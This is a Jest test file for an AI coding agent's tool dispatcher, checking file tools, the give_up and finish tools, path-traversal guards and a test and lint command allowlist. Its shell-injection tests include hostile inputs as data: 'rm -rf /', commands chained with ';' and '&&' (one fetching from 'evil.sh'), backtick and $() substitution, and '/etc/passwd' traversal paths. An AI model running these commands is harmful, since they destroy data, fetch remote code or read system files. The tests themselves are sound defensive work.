const fs = require('fs');
const os = require('os');
const path = require('path');

const {
  dispatchTool,
  safeJoin,
  ALLOWED_TEST_COMMANDS,
  parseTestCommand
} = require('../src/agents/tools');

// Helper: a test allowlist contains a given command if any prefix matches.
function allowlistContains(prefix) {
  const tokens = prefix.split(/\s+/);
  return ALLOWED_TEST_COMMANDS.some(p =>
    p.length === tokens.length && p.every((t, i) => t === tokens[i])
  );
}

describe('tools', () => {
  let tmpDir;
  let ctx;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tools-'));
    fs.writeFileSync(path.join(tmpDir, 'hello.js'), 'console.log("hello");\n');
    fs.mkdirSync(path.join(tmpDir, 'src'));
    fs.writeFileSync(path.join(tmpDir, 'src', 'a.js'), 'const x = 1;\n');
    ctx = { repoPath: tmpDir };
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  describe('safeJoin', () => {
    test('allows paths inside repo', () => {
      expect(safeJoin(tmpDir, 'src/a.js')).toBe(path.resolve(tmpDir, 'src/a.js'));
    });

    test('rejects path traversal', () => {
      expect(() => safeJoin(tmpDir, '../../../etc/passwd')).toThrow(/outside repo/);
    });

    test('rejects absolute paths outside repo', () => {
      expect(() => safeJoin(tmpDir, '/etc/passwd')).toThrow(/outside repo/);
    });
  });

  describe('read_file', () => {
    test('reads file contents', async () => {
      const r = await dispatchTool('read_file', { path: 'hello.js' }, ctx);
      expect(r.ok).toBe(true);
      expect(r.content).toBe('console.log("hello");\n');
    });

    test('returns error for missing file', async () => {
      const r = await dispatchTool('read_file', { path: 'nope.js' }, ctx);
      expect(r.ok).toBe(false);
      expect(r.error).toMatch(/ENOENT|no such file/);
    });

    test('blocks path traversal', async () => {
      const r = await dispatchTool('read_file', { path: '../../etc/passwd' }, ctx);
      expect(r.ok).toBe(false);
      expect(r.error).toMatch(/outside repo/);
    });
  });

  describe('write_file', () => {
    test('writes new file and creates dirs', async () => {
      const r = await dispatchTool('write_file', { path: 'new/dir/file.js', content: 'x' }, ctx);
      expect(r.ok).toBe(true);
      expect(fs.readFileSync(path.join(tmpDir, 'new/dir/file.js'), 'utf8')).toBe('x');
    });
  });

  describe('apply_patch', () => {
    test('replaces unique substring', async () => {
      const r = await dispatchTool('apply_patch', {
        path: 'hello.js',
        old_string: 'console.log("hello");',
        new_string: 'console.log("bye");'
      }, ctx);
      expect(r.ok).toBe(true);
      expect(fs.readFileSync(path.join(tmpDir, 'hello.js'), 'utf8')).toBe('console.log("bye");\n');
    });

    test('fails when old_string not found', async () => {
      const r = await dispatchTool('apply_patch', {
        path: 'hello.js',
        old_string: 'does not exist',
        new_string: 'whatever'
      }, ctx);
      expect(r.ok).toBe(false);
      expect(r.error).toMatch(/not found/);
    });

    test('fails when old_string appears more than once', async () => {
      fs.writeFileSync(path.join(tmpDir, 'dup.js'), 'foo\nfoo\n');
      const r = await dispatchTool('apply_patch', {
        path: 'dup.js',
        old_string: 'foo',
        new_string: 'bar'
      }, ctx);
      expect(r.ok).toBe(false);
      expect(r.error).toMatch(/2 times/);
    });
  });

  describe('list_files', () => {
    test('lists source files under root', async () => {
      const r = await dispatchTool('list_files', { dir: '' }, ctx);
      expect(r.ok).toBe(true);
      expect(r.files).toContain('hello.js');
      expect(r.files).toContain('src/a.js');
    });
  });

  describe('run_tests', () => {
    test('rejects commands not in allowlist', async () => {
      const r = await dispatchTool('run_tests', { command: 'rm -rf /' }, ctx);
      expect(r.ok).toBe(false);
      expect(r.error).toMatch(/allowlist/);
    });

    test('allowlist includes common test commands', () => {
      expect(allowlistContains('npm test')).toBe(true);
      expect(allowlistContains('pytest')).toBe(true);
      expect(allowlistContains('go test')).toBe(true);
    });
  });

  describe('parseTestCommand (shell-injection guard)', () => {
    test('accepts a plain allowlisted command', () => {
      const r = parseTestCommand('pytest');
      expect(r.error).toBeUndefined();
      expect(r.args).toEqual([]);
    });

    test('accepts allowlisted command with extra args', () => {
      const r = parseTestCommand('pytest tests/ --maxfail=1');
      expect(r.error).toBeUndefined();
      expect(r.args).toEqual(['tests/', '--maxfail=1']);
    });

    test('rejects command chaining with ;', () => {
      const r = parseTestCommand('npm test; rm -rf /');
      expect(r.error).toMatch(/metacharacters/);
    });

    test('rejects command chaining with &&', () => {
      const r = parseTestCommand('npm test && curl evil.sh');
      expect(r.error).toMatch(/metacharacters/);
    });

    test('rejects backtick substitution', () => {
      const r = parseTestCommand('npm test `whoami`');
      expect(r.error).toMatch(/metacharacters/);
    });

    test('rejects $() substitution', () => {
      const r = parseTestCommand('npm test $(id)');
      expect(r.error).toMatch(/metacharacters/);
    });

    test('rejects commands outside allowlist', () => {
      const r = parseTestCommand('rm -rf /tmp');
      expect(r.error).toMatch(/allowlist/);
    });

    test('matches multi-token prefix like npm run test', () => {
      const r = parseTestCommand('npm run test -- --watchAll=false');
      expect(r.error).toBeUndefined();
      expect(r.args).toEqual(['run', 'test', '--', '--watchAll=false']);
    });
  });

  describe('finish', () => {
    test('returns ok with the pr_summary', async () => {
      const r = await dispatchTool('finish', { pr_summary: 'Fixed the bug.' }, ctx);
      expect(r.ok).toBe(true);
      expect(r.pr_summary).toBe('Fixed the bug.');
    });
  });

  describe('give_up', () => {
    test('returns gave_up:true with reason, explanation, blockers', async () => {
      const r = await dispatchTool('give_up', {
        reason: 'too_complex',
        explanation: 'Would need to change 8 files across 3 packages.',
        blockers: ['no CONTRIBUTING.md', 'tests require GPU']
      }, ctx);
      expect(r.ok).toBe(true);
      expect(r.gave_up).toBe(true);
      expect(r.reason).toBe('too_complex');
      expect(r.blockers).toHaveLength(2);
    });

    test('defaults blockers to empty array when omitted', async () => {
      const r = await dispatchTool('give_up', {
        reason: 'needs_human',
        explanation: 'Architectural decision.'
      }, ctx);
      expect(r.blockers).toEqual([]);
    });
  });

  describe('write_file — overwrite safety', () => {
    test('refuses to overwrite an existing file without overwrite:true', async () => {
      const r = await dispatchTool('write_file', {
        path: 'hello.js', content: 'new'
      }, ctx);
      expect(r.ok).toBe(false);
      expect(r.error).toMatch(/already exists/);
    });

    test('overwrites when overwrite:true is explicitly passed', async () => {
      const r = await dispatchTool('write_file', {
        path: 'hello.js', content: 'new', overwrite: true
      }, ctx);
      expect(r.ok).toBe(true);
      expect(r.overwrote).toBe(true);
    });

    test('creates new files without requiring overwrite:true', async () => {
      const r = await dispatchTool('write_file', {
        path: 'brand-new.js', content: 'hi'
      }, ctx);
      expect(r.ok).toBe(true);
      expect(r.overwrote).toBe(false);
    });
  });

  describe('apply_patch — fallback strategies', () => {
    test('exact match works like before', async () => {
      const r = await dispatchTool('apply_patch', {
        path: 'hello.js',
        old_string: 'console.log("hello");',
        new_string: 'console.log("yo");'
      }, ctx);
      expect(r.ok).toBe(true);
      expect(r.message).toMatch(/exact match/);
    });

    test('whitespace-normalized fallback succeeds when whitespace drifts', async () => {
      // Simulate a file that uses tabs, while the agent sends spaces.
      fs.writeFileSync(path.join(tmpDir, 'indent.py'), 'def foo():\n\treturn\t\t1\n');
      const r = await dispatchTool('apply_patch', {
        path: 'indent.py',
        old_string: 'def foo():\n    return  1',
        new_string: 'def foo():\n    return 2'
      }, ctx);
      expect(r.ok).toBe(true);
      expect(r.message).toMatch(/whitespace-normalized/);
    });

    test('error includes closest-line hint when match fails', async () => {
      fs.writeFileSync(path.join(tmpDir, 'multi.js'),
        'const a = 1;\nconst b = 2;\nconst actually_relevant_thing = 3;\n');
      const r = await dispatchTool('apply_patch', {
        path: 'multi.js',
        old_string: 'const actually_relevant_typo = 3;',
        new_string: 'removed'
      }, ctx);
      expect(r.ok).toBe(false);
      expect(r.error).toMatch(/not found/);
    });
  });

  describe('apply_patch_range', () => {
    test('replaces a line range', async () => {
      fs.writeFileSync(path.join(tmpDir, 'lines.txt'), 'A\nB\nC\nD\n');
      const r = await dispatchTool('apply_patch_range', {
        path: 'lines.txt', start_line: 2, end_line: 3, new_content: 'X\nY\nZ'
      }, ctx);
      expect(r.ok).toBe(true);
      const after = fs.readFileSync(path.join(tmpDir, 'lines.txt'), 'utf8');
      expect(after).toBe('A\nX\nY\nZ\nD\n');
    });

    test('rejects out-of-range line numbers', async () => {
      fs.writeFileSync(path.join(tmpDir, 'lines.txt'), 'A\nB\n');
      const r = await dispatchTool('apply_patch_range', {
        path: 'lines.txt', start_line: 1, end_line: 99, new_content: 'X'
      }, ctx);
      expect(r.ok).toBe(false);
      expect(r.error).toMatch(/Invalid range/);
    });

    test('rejects non-integer line numbers', async () => {
      fs.writeFileSync(path.join(tmpDir, 'lines.txt'), 'A\n');
      const r = await dispatchTool('apply_patch_range', {
        path: 'lines.txt', start_line: 1.5, end_line: 1, new_content: 'X'
      }, ctx);
      expect(r.ok).toBe(false);
      expect(r.error).toMatch(/integers/);
    });
  });

  describe('find_relevant_files', () => {
    test('returns candidates ranked by score', async () => {
      fs.mkdirSync(path.join(tmpDir, 'auth'));
      fs.writeFileSync(path.join(tmpDir, 'auth', 'login.py'), 'def login(email): pass');
      const r = await dispatchTool('find_relevant_files', {
        query: 'login email bug', top_k: 5
      }, ctx);
      expect(r.ok).toBe(true);
      expect(Array.isArray(r.candidates)).toBe(true);
      expect(r.candidates[0].path).toMatch(/login/);
    });
  });

  describe('run_lint — allowlist', () => {
    const { parseLintCommand } = require('../src/agents/tools');
    test('accepts ruff check', () => {
      const r = parseLintCommand('ruff check .');
      expect(r.error).toBeUndefined();
    });
    test('accepts black --check', () => {
      const r = parseLintCommand('black --check .');
      expect(r.error).toBeUndefined();
    });
    test('rejects arbitrary commands', () => {
      const r = parseLintCommand('rm -rf /');
      expect(r.error).toMatch(/allowlist/);
    });
    test('rejects shell injection', () => {
      const r = parseLintCommand('ruff check .; evil');
      expect(r.error).toMatch(/metacharacters/);
    });
  });

  describe('dispatchTool', () => {
    test('returns error for unknown tool', async () => {
      const r = await dispatchTool('does_not_exist', {}, ctx);
      expect(r.ok).toBe(false);
      expect(r.error).toMatch(/Unknown tool/);
    });
  });
});
